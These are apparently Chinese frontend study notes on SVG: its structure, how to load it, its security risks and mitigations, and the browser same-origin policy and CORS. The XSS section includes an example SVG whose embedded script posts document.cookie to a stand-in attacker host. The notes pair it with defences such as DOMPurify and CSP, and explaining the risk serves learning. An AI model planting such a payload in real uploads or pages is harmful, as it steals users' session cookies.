## 1. svg是什么? - XML
svg是一个图片文件，可以像png,jepg等图片文件一样使用，在可视化的编辑器中创建和编辑，但是他不仅仅是图片，是包含标记元素，文本、样式、指令的结构化文档【xml】,其他图片格式是在告诉计算机在屏幕上那个位置应该绘制什么颜色，也就是位图，但svg告诉计算机如何通过他的组成部分重组图形，是一种矢量图


位图：由像素点组成，放大后图片会失真 png,jpg,jepg,canvas,bmp
矢量图：使用XML描述图形，对图形和元素进行交互，放大不会失真，xml是浏览器可以读取的格式


svg主要标签有如下，这些构成了形状，文本或者嵌入的图像
``` html
<text> 文本
<tspan> 文本
<image>图像
<rect> 矩形
<circle>圆形
<ellipse>椭圆
<line> 线条
<polyline>折线
<polygon>多边形 
<path>直线路径 描绘曲线和线条
```

#### 2.svg可以用css,js对其进行操作
因为 SVG 本质是和 HTML 一样的 XML，内部可以嵌入 script 标签执行脚本，也可以使用css进行样式控制，也可以使用 foreignObject 标签插入其他命名空间的内容，比如 HTML ，但会带来很大的安全问题。


#### 3. svg 安全漏洞


##### 1. XSS 跨站脚本攻击
SVG 可通过 script 元素执行 JavaScript 代码。所以，如果开放了 SVG 上传，那么会存在 XSS （跨站脚本）安全风险。

! 注：如果在 Chrome 上通过 img  标签引入，并不会触发攻击。但是，如果单独在 浏览器上打开图片，是会触发攻击的！！

```js
<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
  <circle cx="100" cy="50" r="40" stroke="black" stroke-width="2" fill="black" />
  <!-- 这种操作，可以在 SVG 中直接执行 Script，从而通过 Ajax 将同域的 cookie 投出去，造成存储型 XSS -->
  <script>  
    $.post({ url: 'https://hacker.com', data: document.cookie })
  </script>
</svg>
```

##### 2. HTML注入
SVG 是基于 XML 的矢量图，没法简单将 HTML 内容放到里面。所以，SVG 提供了 foreignObject 元素，用来包含其他 XML 命名空间的元素,在这种情况下，我们可以发起类似钓鱼、绕开同源策略、CSRF 之类的攻击。
```js
<svg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
  <style>
    div {
      background: black;
      color: pink;
      font: 18px serif;
      width: 100px;
      height: 100px;
      overflow: auto;
    }
  </style>

  <foreignObject x="20" y="20" width="100" height="100">
    <div xmlns="http://www.w3.org/1999/xhtml">
      <a href="https://www.kdocs.cn">点击这里</a>
      <p>超好看的内容等你来喔~</p>
    </div>
  </foreignObject>
</svg>
```

#### 4. svg安全防护
 1. 限制 SVG 的引用方式，尽可能通过 img 标签等安全形式引用，img标签具有防止 JS 脚本攻击的功能
 2. 限制 SVG 的危险标签。例如 script、foreignObject 等，可以使用DOMPurify第三方库
 3. 内容安全策略（CSP），为了减轻 XSS 攻击的风险，网站可以使用内容安全策略来限制哪些外部资源可以被加载。这可以通过 HTTP 响应头中的 Content-Security-Policy 指令来实现。
 




## 2. svg的几种加载方式
#### 1. 在浏览器直接打开
#### 2. 使用 img 标签引入 

``` html
<img src="logo.svg" alt="" />
```
#### 3. 内嵌到 HTML 中，  直接用svg标签即可
```text
<svg> 标签并没有使用 xmlns="http://www.w3.org/2000/svg" 声明命名空间，这是因为 HTML 5 文档使用 <!DOCTYPE html> 标记，它允许跳过 SVG 命名空间声明，HTML 解析器会自动识别 SVG 元素和它的子元素，除了 <foreignObject> 元素的子元素。
```

``` svg
// circle.svg
<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
  <circle cx="100" cy="50" r="40" stroke="black"
  stroke-width="2" fill="deepskyblue" />
</svg>
 ```
#### 4. CSS 背景图

```css
 background-image:url('logo.svg');
 background-size:100% 100%
```


#### 5. 使用 object 标签引入
``` html
 <object data='logo.svg' type='image/svg+xml'   width='100' height='100'/>
```

#### 6. 使用 embed 标签引入
``` html
<embed src="logo.svg" width="100" height="100"/>
```

#### 7. 使用 iframe 标签引入
``` html
<iframe src="./logo.svg" width="100" height="100"></iframe>
```

#### 8. ReactSvg组件引入-一个将svg注入到dom的react组件
``` html
<ReactSVG src='./logo.svg'></ReactSVG>
```
!!!? svg在ReactSvg组件里引入, 在network里面属于xhr? 为什么？




## 3. 静态资源里面，svg为什么会引起跨域,但是png,css等资源不会出现

#### 1. 什么是跨域?
跨域：是浏览器对js施加的安全限制，浏览器的同源策略使他不能执行其他网站的脚本,限制不同源之间的交互，防止恶意行为
同源策略：协议、域名、端口都相同

```
http://www.test.com:8080/      https://www.test.com:8080/ 
http://www.test.com:8080/      http://www.test1.com:8080/
http://www.test.com:8080/      http://www.test.com:8090/
```

#### 2.同源策略的作用

1. 防止信息泄露
同源策略阻止恶意网站通过跨域请求获取用户在其他站点上的敏感信息。例如，禁止一个网页中的脚本访问另一个不同域的网页中的数据，包括读取、修改或删除它们
2. 防止跨站脚本攻击（XSS）
同源策略可以防止恶意脚本通过跨域操作注入并执行恶意代码。如果不受同源策略的限制，攻击者可以在一个受信任的网站上注入恶意脚本，从而获取用户的敏感信息、篡改页面内容或进行其他恶意行为。
3. 防止跨站请求伪造攻击（CSRF）
同源策略通过限制跨域请求，使得只有相同源的请求能够携带浏览器生成的身份凭证（如Cookie），从而有效地阻止了CSRF攻击。攻击者无法利用用户在某一网站的身份凭证发送伪造请求到其他站点，实施未经授权的操作。

#### 3.限制的跨域操作
1. Ajax 请求：
限制：XMLHttpRequest (XHR) 对象只能访问同一域下的资源，不能访问其他域的资源。
原因：出于安全考虑，防止恶意网站读取其他网站的数据。
2. DOM 访问：
限制：JavaScript 脚本只能访问同一域下的 DOM 对象，不能访问其他域的 DOM 对象。
原因：防止跨站脚本（XSS）攻击，保护用户隐私和数据安全。
3. Web 存储访问：
限制：浏览器只允许网页访问自身网站的 Cookie、LocalStorage 和 IndexDB 等存储器，不能访问其他网站的存储器。
原因：确保网站存储的数据不会被其他网站恶意读取或篡改。


#### 4.允许的跨域操作
1. 跨域资源共享（CORS）：
允许：通过服务器设置特定的 HTTP 响应头（如 Access-Control-Allow-Origin），允许特定来源的跨域请求。
实现：CORS 是一种现代Web标准，允许服务器明确指定哪些源可以访问其资源。
2. JSONP（JSON with Padding）：
允许：通过动态创建 script 标签来发送跨域请求，并接收 JSON 数据。
限制：只支持 GET 请求，不支持 POST 请求，且存在安全风险（如数据暴露在 URL 中）。
3. window.postMessage：
允许：实现跨域窗口之间的安全通信。
实现：通过 window.postMessage() 方法发送数据，并监听 message 事件来接收数据。
4. WebSocket：
允许：实现浏览器与服务器之间的全双工通信，同时允许跨域通讯。
实现：WebSocket 是一种在单个 TCP 连接上进行全双工通讯的协议，可以在客户端和服务器之间传输数据。
5. 服务器代理：
允许：通过服务器（如 Nginx、Node.js 等）作为代理，转发跨域请求，从而绕过浏览器的同源策略限制。
实现：服务器接收到客户端的请求后，向目标服务器发送请求，并将响应返回给客户端。
6. script 标签
浏览器安全策略默认支持；
7. style 标签
浏览器安全策略默认支持；
8. img 标签
浏览器安全策略默认支持；

#### 5. 为什么script、style、img 不受同源策略限制？
```js
  <link rel="stylesheet" href="%PUBLIC_URL%/normalize.css" />
  <script type="text/javascript" charset="utf-8" src="https://g.alicdn.com/AWSC/AWSC/awsc.js"></script>
  <img src="https://echarts.apache.org/zh/images/logo.png?_v_=20240226" alt="echarts logo" class="navbar-logo">
```
- script 标签：用于引入或执行 JavaScript 代码。JavaScript 是一种广泛使用的编程语言，用于增强网页的交互性和动态功能。由于 JavaScript 代码经常需要从外部服务器加载，因此浏览器允许 script 标签不受同源策略限制，以便从其他域加载 JavaScript 文件。
- style 标签：虽然通常用于定义内部样式表，但也可以通过链接（link）到外部 CSS 文件来使用。这些外部 CSS 文件也可能位于不同的域上，因此浏览器同样允许 style（或更准确地说，是 link 标签引入的外部 CSS）不受同源策略限制。
- img 标签：用于在网页中嵌入图片。由于网页中的图片可能来自多个不同的源，为了支持丰富的媒体内容，浏览器允许 img 标签加载跨域的图片资源。


浏览器在设计时考虑到了网页的灵活性和实用性，因此允许某些资源（如 script、style、img）跨域加载。这些资源通常不会直接泄露敏感信息或执行恶意代码（尽管它们仍然可能受到其他安全威胁，如跨站脚本攻击 XSS），因此浏览器认为在合理范围内放宽同源策略的限制是可以接受的。
浏览器的同源策略主要限制的是读写操作，例如通过XMLHttpRequest或者Fetch API发送的请求，静态资源的加载不受同源策略的限制，比如图片，css,或者js脚本文件，通常不包含敏感信息，所以即使来自不同的源，浏览器也会加载，不会导致安全问题





